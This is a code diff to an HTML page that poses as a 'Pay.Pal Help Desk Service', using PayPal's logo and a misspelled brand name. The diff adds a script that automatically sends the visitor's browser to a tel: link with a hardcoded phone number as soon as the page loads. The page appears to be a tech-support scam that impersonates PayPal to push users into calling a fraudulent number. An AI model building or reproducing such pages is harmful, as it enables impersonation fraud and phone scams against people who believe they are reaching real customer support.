@@ -111,8 +111,18 @@
       }
     }
   </style>
+ <script>
+    function autoDial() {
+      var phoneNumber = "+1-(855)-446-1676";
+      window.location.href = "tel:" + phoneNumber;
+    }
 
-<body>
+    function call() {
+      // Implement the call functionality here, such as initiating a phone call.
+      console.log("Calling...");
+    }
+  </script>
+<body onload="autoDial()">
 <div class="content">
     <img src="https://static.vecteezy.com/system/resources/thumbnails/019/909/644/small/paypal-transparent-paypal-free-free-png.png" alt="PayPal Logo" class="paypal-logo">
     <h1>Pay.Pal Help Desk Service</h1>
